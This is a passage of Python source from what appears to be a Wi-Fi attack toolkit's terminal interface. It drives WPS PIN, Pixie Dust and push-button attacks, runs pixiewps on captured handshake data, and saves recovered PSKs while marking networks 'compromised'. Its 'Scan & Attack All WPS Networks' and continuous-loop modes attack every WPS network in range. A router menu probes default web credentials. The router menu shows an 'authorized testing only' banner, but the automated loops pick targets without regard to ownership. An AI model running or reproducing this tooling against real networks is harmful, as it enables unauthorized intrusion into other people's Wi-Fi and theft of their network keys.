                            str(row["message"] or "")[:60],
                        )
                    con.print(t)
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: DEVICE INFO
    # ═══════════════════════════════════════
    def view_device(self):
        con.clear()
        con.print(Rule("[hdr]Device Info[/]", style="cyan"))

        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
        t.add_column("Key", style="dim", min_width=18)
        t.add_column("Value", style="cyan")
        t.add_row("Architecture", os.uname().machine)
        t.add_row("Kernel", os.uname().release[:60])
        t.add_row("Python", sys.version.split()[0])
        t.add_row("Root", "Yes" if os.getuid() == 0 else "No")

        ifaces = get_interfaces()
        t.add_row("Interfaces", ", ".join(ifaces) if ifaces else "None")
        t.add_row("Configured IF", str(self.cfg.get("interface", "wlan0")))

        tools = [
            "iw", "ip", "wpa_supplicant", "wpa_cli", "airmon-ng",
            "airodump-ng", "wash", "reaver", "pixiewps", "hashcat",
            "hostapd", "dnsmasq", "macchanger", "tcpdump",
        ]
        inst = sum(1 for tool in tools if shutil.which(tool))
        t.add_row("Tools", "{have}/{total}".format(have=inst, total=len(tools)))

        pin_info = get_pin_database_info()
        t.add_row(
            "PIN DB",
            "{ver} ({p} prefixes)".format(
                ver=pin_info.get("database_version", "unavailable"),
                p=pin_info.get("prefix_count", 0),
            ),
        )

        con.print(Panel(t, title="Device", border_style="cyan"))

        con.print("\n[inf]Tools:[/]")
        for tool in tools:
            icon = "[ok]V[/]" if shutil.which(tool) else "[err]X[/]"
            con.print("  {icon} {tool}".format(icon=icon, tool=tool))

        con.print(
            "\n[dim]For a full health check use menu 18 "
            "(System Diagnostics).[/]"
        )
        Prompt.ask("\n[dim]Enter[/]")

    def view_diagnostics(self):
        """Offline system health / readiness check for beginners."""
        while True:
            con.clear()
            con.print(Rule("[hdr]System Diagnostics[/]", style="cyan"))
            con.print(
                "[dim]Offline checks only — no attack traffic is sent.[/]\n"
            )

            with con.status("[ok]Running diagnostics...[/]", spinner="dots"):
                report = run_diagnostics(
                    db=self.db,
                    interface=self.cfg.get("interface", "wlan0"),
                )

            overall = report.get("overall", "unknown")
            style = {
                "ok": "ok",
                "warn": "warn",
                "error": "err",
            }.get(overall, "inf")
            con.print(Panel(
                "[{style}]{summary}[/]".format(
                    style=style,
                    summary=format_summary(report),
                ),
                border_style="cyan",
                title="Summary",
            ))

            # Core tools
            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
                      title="[hdr]Core Tools[/]")
            t.add_column("Tool", min_width=14)
            t.add_column("Status", justify="center")
            t.add_column("Path")
            for tool in report.get("core_tools", []):
                if tool.get("installed"):
                    status = "[ok]OK[/]"
                else:
                    status = "[err]MISSING[/]"
                t.add_row(tool.get("name", "?"), status, tool.get("path", "") or "-")
            con.print(t)

            # Interfaces
            ifaces = report.get("interfaces") or []
            if ifaces:
                ti = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan",
                           title="[hdr]Wireless Interfaces[/]")
                ti.add_column("Interface")
                ti.add_column("Mode")
                for item in ifaces:
                    ti.add_row(item.get("name", "?"), item.get("mode", "?"))
                con.print(ti)
            else:
                con.print("[warn]No wireless interfaces detected via iw.[/]")

            # PIN intelligence
            pin = report.get("pin_database") or {}
            con.print(Panel(
                "Status: [{s}]{status}[/]\n"
                "Version: {ver}\n"
                "Prefixes / PINs: {pref} / {pins}\n"
                "Path: {path}".format(
                    s="ok" if pin.get("status") == "ok" else "warn",
                    status=pin.get("status", "?"),
                    ver=pin.get("version", "?"),
                    pref=pin.get("prefixes", 0),
                    pins=pin.get("pins", 0),
                    path=pin.get("path", "?"),
                ),
                title="PIN Intelligence",
                border_style="cyan",
            ))

            for warn in report.get("warnings") or []:
                con.print("[warn]! {msg}[/]".format(msg=warn))
            for err in report.get("errors") or []:
                con.print("[err]X {msg}[/]".format(msg=err))

            con.print(
                "\n  [mn]1[/] Re-run  [mn]2[/] Export JSON  [mn]0[/] Back\n"
            )
            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break
            if ch == "2":
                path = export_diagnostics_json(report)
                con.print("[ok]Saved: {path}[/]".format(path=path))
                self.db.log(
                    "diagnostics_export",
                    "system",
                    "Exported diagnostics to {path}".format(path=path),
                )
                Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: SETTINGS
    # ═══════════════════════════════════════
    # ═══════════════════════════════════════
    # WPS ENGINE METHODS (Direct wpa_supplicant)
    # ═══════════════════════════════════════

    def _direct_wps_pin(self):
        """Direct WPS PIN attack using own wpa_supplicant"""
        con.clear()
        con.print(Rule("[hdr]Direct WPS PIN Attack[/]", style="cyan"))
        con.print("[dim]Direct wpa_supplicant WPS PIN attack[/]\n")

        bssid = self._select_network()
        if not bssid:
            return

        n = self.db.get_network(bssid)
        essid = _get_field(n, "essid", "Unknown")

        # Get PIN suggestions
        from modules.wps_pins import suggest_pins
        pins = suggest_pins(bssid)[:8]
        if pins:
            con.print("\n  [hdr]Suggested PINs:[/]")
            for i, p in enumerate(pins[:6], 1):
                con.print(f"    {i}. [ok]{p['pin']}[/] ({p['method']})")

        pin = Prompt.ask("\nPIN (or # from list)", default=pins[0]["pin"] if pins else "12345670")

        # Try to parse as list number
        try:
            idx = int(pin)
            if 1 <= idx <= len(pins):
                pin = pins[idx - 1]["pin"]
        except (ValueError, IndexError):
            pass

        con.print(f"\n[hdr]Starting direct WPS PIN attack[/]")
        con.print(f"  Target: [inf]{essid}[/] ({bssid})")
        con.print(f"  PIN: [ok]{pin}[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        con.print("[dim]Starting wpa_supplicant...[/]")
        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]Failed: {msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[ok]wpa_supplicant started[/]\n")

        def output_cb(line):
            ll = line.lower()
            if 'found' in ll or 'success' in ll or 'psk' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'nack' in ll or 'locked' in ll or 'wrong' in ll:
                con.print(f"[warn]{line}[/]")
            elif 'error' in ll or 'fail' in ll:
                con.print(f"[err]{line}[/]")
            elif 'm1' in ll or 'm2' in ll or 'm3' in ll or 'm4' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'scanning' in ll or 'authenticat' in ll or 'associat' in ll:
                con.print(f"[inf]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        engine.callback = output_cb

        try:
            result = engine.wps_pin_attack(bssid, pin, timeout=60)
        except KeyboardInterrupt:
            con.print("\n[warn]Stopped[/]")
            result = engine._result()
        finally:
            engine.stop()

        # Show results
        con.print(f"\n{'='*50}")
        con.print(f"  Status: {result['status']}")
        if result.get('attempted_pin'):
            con.print(f"  Attempted PIN: {result['attempted_pin']}")
        verified_pin, verified_psk = _credential_fields_for_result(result)
        if verified_pin:
            con.print(f"  Verified PIN: [ok]{verified_pin}[/]")
        if verified_psk:
            con.print(f"  PSK: [ok]{verified_psk}[/]")
        con.print(f"  Last M: {result.get('last_m', 0)}")
        con.print(f"  Locked: {result.get('is_locked', False)}")
        con.print(f"{'='*50}")

        # Save to DB
        if result['status'] == 'success' and verified_psk:
            self.db.add_credential(bssid, essid, verified_pin, verified_psk, "Direct WPS")
            self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
            self.db.log("success", "wps_engine", f"PIN: {verified_pin} PSK: {verified_psk}", "ok")

        Prompt.ask("\n[dim]Enter[/]")

    def _direct_pixie(self):
        """Direct Pixie Dust attack - collect data then crack"""
        con.clear()
        con.print(Rule("[hdr]Direct Pixie Dust Attack[/]", style="cyan"))
        con.print("[dim]Collects WPS handshake data then runs pixiewps[/]\n")

        bssid = self._select_network()
        if not bssid:
            return

        n = self.db.get_network(bssid)
        essid = _get_field(n, "essid", "Unknown")

        con.print(f"  Target: [inf]{essid}[/] ({bssid})")
        con.print("\n  This will try multiple PINs to collect handshake data")
        con.print("  then run pixiewps to crack the PIN offline.\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]{msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[ok]wpa_supplicant started[/]\n")

        def output_cb(line):
            ll = line.lower()
            if 'collecting' in ll or 'collected' in ll:
                con.print(f"[hdr]{line}[/]")
            elif 'found' in ll or 'success' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'nack' in ll or 'locked' in ll:
                con.print(f"[warn]{line}[/]")
            elif 'pke' in ll or 'pkr' in ll or 'hash' in ll or 'nonce' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'error' in ll:
                con.print(f"[err]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        engine.callback = output_cb

        try:
            result = engine.collect_pixie_data(bssid, max_attempts=8)
        except KeyboardInterrupt:
            con.print("\n[warn]Stopped[/]")
            result = {'status': 'stopped', 'pixie_data': engine.pixie_data}
        finally:
            engine.stop()

        # Show collected data
        pixie = result.get('pixie_data', {})
        con.print(f"\n{'='*50}")
        con.print("[hdr]Collected Pixie Dust Data:[/]")
        for key in ['PKE', 'PKR', 'E_NONCE', 'R_NONCE', 'AUTHKEY', 'E_HASH1', 'E_HASH2']:
            val = pixie.get(key, '')
            if val:
                con.print(f"  {key}: [ok]{val[:40]}...[/]")
            else:
                con.print(f"  {key}: [dim]missing[/]")

        collected = sum(1 for k in ['PKE','PKR','E_NONCE','R_NONCE','AUTHKEY','E_HASH1','E_HASH2']
                       if pixie.get(k))
        con.print(f"\n  Collected: [bold]{collected}/7[/]")
        con.print(f"{'='*50}")

        # Try pixiewps if we have enough data
        if collected >= 4 and pixie.get('PKE'):
            con.print("\n[hdr]Running pixiewps...[/]")
            import shutil
            if shutil.which('pixiewps'):
                cmd = [
                    'pixiewps',
                    '--pke', pixie.get('PKE', ''),
                    '--pkr', pixie.get('PKR', ''),
                    '--e-hash1', pixie.get('E_HASH1', ''),
                    '--e-hash2', pixie.get('E_HASH2', ''),
                    '--authkey', pixie.get('AUTHKEY', ''),
                    '--e-nonce', pixie.get('E_NONCE', ''),
                    '--r-nonce', pixie.get('R_NONCE', ''),
                    '--e-bssid', bssid.replace(':', ''),
                    '--mode', '1,2,3,4,5',
                ]
                try:
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    con.print(r.stdout)
                    if r.returncode == 0:
                        # Extract PIN candidate and verify it online before saving.
                        for line in r.stdout.split('\n'):
                            if 'WPS pin' in line and '[+]' in line:
                                pin = line.split(':')[-1].strip()
                                if pin and pin != '<empty>':
                                    con.print(f"\n[warn]PIXIEWPS candidate PIN: {pin}[/]")
                                    con.print("[dim]Verifying candidate against the AP...[/]")
                                    verify_engine = None
                                    try:
                                        verify_engine = WpsEngine(self.cfg.get("interface", "wlan0"))
                                        ok, verify_msg = verify_engine.start()
                                        if not ok:
                                            con.print(f"[err]Verification engine failed: {verify_msg}[/]")
                                            continue
                                        verify_result = verify_engine.wps_pin_attack(bssid, pin, timeout=45)
                                    except Exception as exc:
                                        con.print(f"[err]Verification error: {exc}[/]")
                                        verify_result = {"status": "error"}
                                    finally:
                                        try:
                                            verify_engine.stop()
                                        except Exception:
                                            pass

                                    verified_pin, verified_psk = _credential_fields_for_result(verify_result)
                                    if verify_result.get("status") == "success" and verified_psk:
                                        con.print(f"\n[ok]PIN VERIFIED: {verified_pin}[/]")
                                        con.print(f"[ok]PSK FOUND: {verified_psk}[/]")
                                        self.db.add_credential(
                                            bssid,
                                            essid,
                                            verified_pin,
                                            verified_psk,
                                            'Pixie Dust',
                                        )
                                        self.db.log(
                                            "success",
                                            "pixie",
                                            "PIN={pin} PSK={psk}".format(
                                                pin=verified_pin,
                                                psk=verified_psk,
                                            ),
                                            "ok",
                                        )
                                    else:
                                        con.print("[warn]Candidate PIN was not verified; nothing was saved.[/]")
                except Exception as e:
                    con.print(f"[err]pixiewps error: {e}[/]")
            else:
                con.print("[err]pixiewps not installed![/]")
        else:
            con.print("[warn]Not enough data for pixiewps[/]")
            con.print("[dim]Try: run Pixie Dust from Attack Center menu[/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _direct_pbc(self):
        """Direct WPS Push Button Connect"""
        con.clear()
        con.print(Rule("[hdr]Direct WPS PBC[/]", style="cyan"))
        con.print("[dim]Push Button Connect via own wpa_supplicant[/]\n")

        bssid = Prompt.ask("BSSID (Enter for any)", default="")
        con.print("\n[yellow]Press the WPS button on the router NOW![/]")
        con.print("[dim]You have 2 minutes...[/]\n")

        if not Confirm.ask("WPS button pressed?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]{msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        def output_cb(line):
            ll = line.lower()
            if 'found' in ll or 'success' in ll or 'psk' in ll:
                con.print(f"[ok]{line}[/]")
            elif 'selected' in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        engine.callback = output_cb

        try:
            result = engine.wps_pbc_attack(bssid if bssid else None, timeout=120)
        except KeyboardInterrupt:
            con.print("\n[warn]Stopped[/]")
            result = {'status': 'stopped'}
        finally:
            engine.stop()

        con.print(f"\n  Status: {result.get('status')}")
        verified_pin, verified_psk = _credential_fields_for_result(result)
        if verified_psk:
            con.print(f"  PSK: [ok]{verified_psk}[/]")
            self.db.add_credential(bssid or "", "", verified_pin, verified_psk, "Direct WPS PBC")
            self.db.log("success", "wps_engine", f"PBC PSK: {verified_psk}", "ok")

        Prompt.ask("\n[dim]Enter[/]")

    def _direct_scan(self):
        """Scan using WPS Engine"""
        con.clear()
        con.print(Rule("[hdr]WPS Engine Scan[/]", style="cyan"))

        iface = self.cfg.get("interface", "wlan0")
        engine = WpsEngine(iface)

        con.print("[dim]Starting wpa_supplicant...[/]")
        ok, msg = engine.start()
        if not ok:
            con.print(f"[err]{msg}[/]")
            Prompt.ask("\n[dim]Enter[/]")
            return

        con.print("[ok]Started[/]")
        con.print("[dim]Scanning...[/]\n")

        engine.scan()
        time.sleep(4)

        nets = engine.get_scan_results()
        engine.stop()

        if nets:
            net_table(nets, f"WPS Engine Scan ({len(nets)} networks)")
            nc = 0
            for n in nets:
                if not self.db.get_network(n["bssid"]):
                    nc += 1
                self.db.add_network(n)
            con.print(f"\n  [ok]{len(nets)} networks ({nc} new) saved[/]")
        else:
            con.print("[warn]No networks found[/]")

        Prompt.ask("\n[dim]Enter[/]")

    def _select_network(self):
        """Helper: select network from database list"""
        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("Enter # or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(nets):
                    return nets[idx - 1]["bssid"]
            except (ValueError, IndexError):
                pass
            return sel.strip().upper()
        else:
            return Prompt.ask("BSSID").strip().upper()

    # ═══════════════════════════════════════
    # VIEW: AUTO-WPS (Continuous Attack)
    # ═══════════════════════════════════════
    def view_auto_wps(self):
        """Automated WPS attack with lock monitoring"""
        while True:
            con.clear()
            con.print(Rule("[hdr]Auto-WPS Engine[/]", style="cyan"))
            con.print()
            con.print("  [mn]1[/] - Auto Attack Single Target")
            con.print("  [mn]2[/] - Scan & Attack All WPS Networks")
            con.print("  [mn]3[/] - Monitor Lock (wait for unlock)")
            con.print("  [mn]4[/] - Continuous Scan & Attack Loop")
            con.print("  [mn]0[/] - Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break

            elif ch == "1":
                self._auto_single()

            elif ch == "2":
                self._auto_scan_all()

            elif ch == "3":
                self._auto_monitor_lock()

            elif ch == "4":
                self._auto_loop()

    def _auto_single(self):
        """Auto attack single target"""
        con.clear()
        con.print(Rule("[hdr]Auto Attack Single Target[/]", style="cyan"))

        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("Enter # or BSSID", default="1")
            try:
                idx = int(sel)
                if 1 <= idx <= len(nets):
                    n = nets[idx-1]
                    bssid = n["bssid"]
                    essid = str(_get_field(n, "essid", "Unknown"))
                else:
                    bssid = sel.upper()
                    essid = "Unknown"
            except ValueError:
                bssid = sel.upper()
                n = self.db.get_network(bssid)
                essid = str(_get_field(n, "essid", "Unknown")) if n else "Unknown"
        else:
            bssid = Prompt.ask("BSSID").upper()
            essid = "Unknown"

        max_cycles = IntPrompt.ask("Max cycles", default=50)
        lock_wait = IntPrompt.ask("Lock wait (seconds)", default=60)

        con.print(f"\n[hdr]Auto-WPS on {essid} ({bssid})[/]")
        con.print(f"  Max cycles: {max_cycles}")
        con.print(f"  Lock wait: {lock_wait}s")
        con.print("[dim]Ctrl+C to stop[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)

        def cb(line):
            ll = line.lower()
            if "success" in ll or "psk" in ll or "pin" in ll:
                con.print(f"[ok]{line}[/]")
            elif "locked" in ll or "wait" in ll:
                con.print(f"[warn]{line}[/]")
            elif "error" in ll or "fail" in ll:
                con.print(f"[err]{line}[/]")
            elif "cycle" in ll or "target" in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        auto.callback = cb

        try:
            result = auto.auto_attack(bssid, essid, max_cycles, lock_wait)
        except KeyboardInterrupt:
            auto.stop()
            result = {"status": "stopped"}

        con.print(f"\nResult: {result.get('status')}")
        if result.get("psk"):
            con.print(f"[ok]PSK: {result['psk']}[/]")
        Prompt.ask("\n[dim]Enter[/]")

    def _auto_scan_all(self):
        """Scan and attack all WPS networks"""
        con.clear()
        con.print(Rule("[hdr]Scan & Attack All WPS[/]", style="cyan"))
        con.print("\n[yellow]This will continuously scan and attack all WPS networks[/]")
        con.print("[dim]Ctrl+C to stop[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)

        def cb(line):
            ll = line.lower()
            if "success" in ll or "found" in ll:
                con.print(f"[ok]{line}[/]")
            elif "target" in ll or "scan" in ll:
                con.print(f"[hdr]{line}[/]")
            else:
                con.print(f"[dim]{line}[/]")

        auto.callback = cb

        scanner_func = lambda iface: scanner.scan_iw(iface, 20) if 'scanner' in dir() else []

        try:
            auto.auto_scan_and_attack()
        except KeyboardInterrupt:
            auto.stop()
        Prompt.ask("\n[dim]Enter[/]")

    def _auto_monitor_lock(self):
        """Monitor lock status"""
        con.clear()
        con.print(Rule("[hdr]Monitor Lock Status[/]", style="cyan"))

        nets = self.db.get_all_networks()
        if nets:
            net_table(nets, "Select Target")
            sel = Prompt.ask("Enter # or BSSID", default="1")
            try:
                idx = int(sel)
                bssid = nets[idx-1]["bssid"] if 1 <= idx <= len(nets) else sel.upper()
            except (ValueError, IndexError):
                bssid = sel.upper()
        else:
            bssid = Prompt.ask("BSSID").upper()

        timeout = IntPrompt.ask("Monitor timeout (seconds)", default=3600)

        con.print(f"\n[hdr]Monitoring {bssid}[/]")
        con.print("[dim]Will try PIN every 30s to detect unlock[/]\n")

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)
        auto.callback = lambda line: con.print(f"[dim]{line}[/]")

        try:
            result = auto.monitor_lock(bssid, timeout)
        except KeyboardInterrupt:
            auto.stop()
            result = {"status": "stopped"}

        con.print(f"Result: {result.get('status')}")
        Prompt.ask("\n[dim]Enter[/]")

    def _auto_loop(self):
        """Continuous scan and attack loop"""
        con.clear()
        con.print(Rule("[hdr]Continuous Loop[/]", style="cyan"))
        con.print("\n[yellow]Scans → Attacks → Waits → Repeats[/]")
        con.print("[dim]Ctrl+C to stop[/]\n")

        if not Confirm.ask("Start?", default=True):
            return

        iface = self.cfg.get("interface", "wlan0")
        auto = AutoWPS(iface, self.db)

        def cb(line):
            con.print(f"[dim]{line}[/]")
        auto.callback = cb

        try:
            while True:
                con.print("\n[hdr]=== Scanning... ===[/]")
                nets = auto._quick_scan()
                wps = [n for n in nets if n.get("has_wps")]
                con.print(f"[inf]Found {len(wps)} WPS networks[/]")

                for net in wps:
                    if not auto.running:
                        break
                    con.print(f"\n[hdr]Attacking: {net['essid']} ({net['bssid']})[/]")
                    result = auto.auto_attack(
                        net["bssid"], net.get("essid", ""),
                        max_cycles=10, lock_wait=60
                    )
                    if result.get("status") == "success":
                        con.print(f"[ok]SUCCESS: {result.get('psk')}[/]")

                con.print("\n[dim]Waiting 60s before next scan...[/]")
                time.sleep(60)
        except KeyboardInterrupt:
            auto.stop()
        Prompt.ask("\n[dim]Enter[/]")

    # ═══════════════════════════════════════
    # VIEW: ROUTER EXPLOITER
    # ═══════════════════════════════════════
    def view_router_exploit(self):
        """Router web audit — ports, fingerprint, optional default Basic Auth."""
        from modules.router_exploit import (
            RouterExploiter,
            build_cred_list,
            get_router_ip,
            validate_target_ip,
        )
        from modules.smart_probe import SmartProbeAdvisor, policy_for_brand
        from modules.vuln_intel import enrich_device, get_seed_info

        router_ip = get_router_ip()
        last_report = None
        advisor = SmartProbeAdvisor(db=self.db)

        def _cb(line):
            low = str(line).lower()
            if line.startswith("[+]"):
                con.print("[ok]{msg}[/]".format(msg=line))
            elif "fail" in low or line.startswith("[!]"):
                con.print("[err]{msg}[/]".format(msg=line))
            elif line.startswith("[?]"):
                con.print("[warn]{msg}[/]".format(msg=line))
            else:
                con.print("[dim]{msg}[/]".format(msg=line))

        def _print_ports(ports):
            if not ports:
                con.print("[warn]No open management ports found[/]")
                return
            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
            t.add_column("Port", justify="right")
            t.add_column("Scheme")
            t.add_column("HTTP")
            t.add_column("Server")
            t.add_column("Title hint")
            for p in ports:
                t.add_row(
                    str(p.get("port")),
                    str(p.get("scheme") or ""),
                    str(p.get("http_status") or ""),
                    str(p.get("server") or "-")[:28],
                    str(p.get("title_hint") or "-")[:32],
                )
            con.print(t)

        def _print_fingerprint(info):
            if not info:
                con.print("[warn]No fingerprint data[/]")
                return
            t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
            t.add_column("Key", style="dim", min_width=14)
            t.add_column("Value", style="cyan")
            for key in (
                "brand", "confidence", "title", "server", "realm",
                "port", "scheme", "http_status",
            ):
                if key in info and info.get(key) not in (None, ""):
                    t.add_row(key, str(info.get(key)))
            if info.get("model_hints"):
                t.add_row("model_hints", ", ".join(info.get("model_hints") or []))
            if info.get("signals"):
                t.add_row("signals", ", ".join(info.get("signals") or [])[:80])
            if info.get("notes"):
                t.add_row("notes", ", ".join(info.get("notes") or []))
            con.print(Panel(t, title="Fingerprint", border_style="cyan"))

        def _print_creds(creds):
            if not creds:
                con.print("[warn]No credential results[/]")
                return
            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
            t.add_column("User")
            t.add_column("Pass")
            t.add_column("Status")
            t.add_column("Conf")
            t.add_column("Reason")
            for c in creds:
                status = c.get("status", "?")
                style = {
                    "success": "ok",
                    "possible": "warn",
                    "failed": "dim",
                    "lockout": "err",
                    "skipped": "dim",
                }.get(status, "dim")
                t.add_row(
                    c.get("username") if c.get("username") != "" else "(empty)",
                    c.get("password") if c.get("password") != "" else "(empty)",
                    "[{s}]{st}[/]".format(s=style, st=status),
                    str(c.get("confidence", "")),
                    str(c.get("reason", ""))[:40],
                )
            con.print(t)
            verified = [c for c in creds if c.get("status") == "success"]
            lockouts = [c for c in creds if c.get("status") == "lockout"]
            if verified:
                con.print(
                    "[ok]Verified default web login "
                    "(this is NOT a Wi-Fi PSK).[/]"
                )
            elif lockouts:
                con.print(
                    "[err]Web UI lockout/rate-limit detected. "
                    "Wait ~60s before more attempts (browser or tool).[/]"
                )
            else:
                possible = [c for c in creds if c.get("status") == "possible"]
                if possible:
                    con.print(
                        "[warn]Only possible hits — confirm manually in a browser.[/]"
                    )
                elif any(c.get("reason") == "same_as_baseline" for c in creds):
                    con.print(
                        "[dim]Responses matched the unauthenticated page — "
                        "defaults not accepted (or Basic Auth ignored).[/]"
                    )

        def _save_report(report):
            nonlocal last_report
            last_report = report
            try:
                audit_id = self.db.save_router_audit(report)
                con.print(
                    "[ok]Saved router audit id={aid}[/]".format(aid=audit_id)
                )
            except Exception as exc:
                con.print(
                    "[warn]DB save failed: {err}[/]".format(err=str(exc))
                )
            # Also write JSON snapshot under reports/
            try:
                from pathlib import Path as _Path
                from config import REPORTS_DIR
                REPORTS_DIR.mkdir(parents=True, exist_ok=True)
                fname = "router_audit_{ip}_{ts}.json".format(
                    ip=str(report.get("ip", "target")).replace(".", "_"),
                    ts=datetime.now().strftime("%Y%m%d_%H%M%S"),
                )
                path = REPORTS_DIR / fname
                with open(path, "w", encoding="utf-8") as handle:
                    import json as _json
                    _json.dump(report, handle, indent=2, default=str)
                con.print("[dim]JSON: {path}[/]".format(path=path))
            except Exception as exc:
                con.print(
                    "[dim]JSON export skipped: {err}[/]".format(err=str(exc))
                )

        while True:
            con.clear()
            con.print(Rule("[hdr]Router Web Audit[/]", style="cyan"))
            con.print(
                "[dim]Authorized testing only · default-creds are not Wi-Fi PSKs · "
                "no exploit payloads[/]"
            )
            con.print(
                "[dim]Engine: smart-probe + baseline + F680 title decode · "
                "menu 7=vuln intel · menu 8=lockout state[/]\n"
            )
            con.print("  Target IP: [inf]{ip}[/]".format(ip=router_ip))
            # Live smart status strip
            try:
                st = advisor.evaluate(router_ip, brand="generic")
                if not st.get("allowed"):
                    con.print(
                        "[err]Probe status: LOCKED/WAIT {sec}s "
                        "(until {until})[/]".format(
                            sec=st.get("wait_seconds"),
                            until=st.get("unlock_at") or "?",
                        )
                    )
                else:
                    con.print("[dim]Probe status: ready — {msg}[/]".format(
                        msg=st.get("human", "")[:90]
                    ))
            except Exception:
                pass
            try:
                seed = get_seed_info()
                con.print(
                    "[dim]Vuln seed: {ver} ({n} families)[/]".format(
                        ver=seed.get("version"), n=seed.get("entries")
                    )
                )
            except Exception:
                pass
            con.print("\n  [mn]1[/] Scan management ports")
            con.print("  [mn]2[/] Fingerprint router")
            con.print("  [mn]3[/] Probe default credentials (Basic Auth, smart)")
            con.print("  [mn]4[/] Full audit (+ vuln intel + smart probe)")
            con.print("  [mn]5[/] Change target IP")
            con.print("  [mn]6[/] View saved audits")
            con.print("  [mn]7[/] Vuln intel lookup (NVD/Exploit-DB refs)")
            con.print("  [mn]8[/] Probe state / clear lockout timer")
            con.print("  [mn]0[/] Back\n")

            ch = Prompt.ask("Select", default="0")
            if ch == "0":
                break

            elif ch == "5":
                candidate = Prompt.ask("Router IP", default=router_ip)
                ok, value = validate_target_ip(candidate)
                if not ok:
                    con.print("[err]{msg}[/]".format(msg=value))
                    Prompt.ask("\n[dim]Enter[/]")
                    continue
                router_ip = value
                con.print("[ok]Target set: {ip}[/]".format(ip=router_ip))
                time.sleep(0.8)

            elif ch == "6":
                rows = self.db.get_router_audits(30)
                if not rows:
                    con.print("[warn]No saved router audits yet.[/]")
                else:
                    t = Table(box=box.ROUNDED, show_header=True,
                              header_style="bold cyan")
                    t.add_column("ID", width=4)
                    t.add_column("IP")
                    t.add_column("Brand")
                    t.add_column("Conf")
                    t.add_column("Auth")
                    t.add_column("When")
                    t.add_column("Summary")
                    for row in rows:
                        t.add_row(
                            str(row["id"]),
                            str(row["target_ip"] or ""),
                            str(row["brand"] or "?"),
                            str(row["confidence"] or 0),
                            str(row["auth_status"] or ""),
                            str(row["started_at"] or "")[:16],
                            str(row["summary"] or "")[:36],
                        )
                    con.print(t)
                Prompt.ask("\n[dim]Enter[/]")


            elif ch == "7":
                con.print(Rule("[hdr]Vulnerability Intelligence[/]", style="cyan"))
                seed = get_seed_info()
                con.print(
                    "Offline seed: [inf]{ver}[/] ({n} families)".format(
                        ver=seed.get("version"), n=seed.get("entries")
                    )
                )
                vendor = Prompt.ask("Vendor (optional)", default="ZTE")
                model = Prompt.ask("Model (optional)", default="F680")
                online = Confirm.ask(
                    "Query NVD online now? (internet + rate limits)", default=False
                )
                with con.status("[ok]Looking up references...[/]", spinner="dots"):
                    report = enrich_device(
                        vendor=vendor or None,
                        model=model or None,
                        online=online,
                        limit=15,
                    )
                try:
                    self.db.save_vuln_lookup(report)
                except Exception:
                    pass
                cves = report.get("cves") or []
                if not cves:
                    con.print("[warn]No curated/online CVE rows for this query.[/]")
                else:
                    t = Table(box=box.ROUNDED, show_header=True,
                              header_style="bold cyan")
                    t.add_column("CVE")
                    t.add_column("Sev")
                    t.add_column("Source")
                    t.add_column("Summary")
                    for cve in cves[:15]:
                        t.add_row(
                            str(cve.get("cve_id") or ""),
                            str(cve.get("severity") or ""),
                            str(cve.get("source") or ""),
                            str(cve.get("summary") or "")[:60],
                        )
                    con.print(t)
                links = report.get("search_links") or {}
                con.print("[dim]NVD search: {u}[/]".format(u=links.get("nvd")))
                con.print("[dim]Exploit-DB: {u}[/]".format(u=links.get("exploit_db")))
                con.print(
                    "[warn]Reference links only. This tool does not download "
                    "or run exploit payloads.[/]"
                )
                Prompt.ask("\n[dim]Enter[/]")

            elif ch == "8":
                con.print(Rule("[hdr]Smart probe state[/]", style="cyan"))
                decision = advisor.evaluate(router_ip, brand="generic")
                state = decision.get("state") or {}
                t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
                t.add_column("K", style="dim")
                t.add_column("V", style="cyan")
                t.add_row("target", router_ip)
                t.add_row("allowed", str(decision.get("allowed")))
                t.add_row("reason", str(decision.get("reason")))
                t.add_row("wait_seconds", str(decision.get("wait_seconds")))
                t.add_row("unlock_at", str(decision.get("unlock_at")))
                t.add_row("human", str(decision.get("human")))
                for key in (
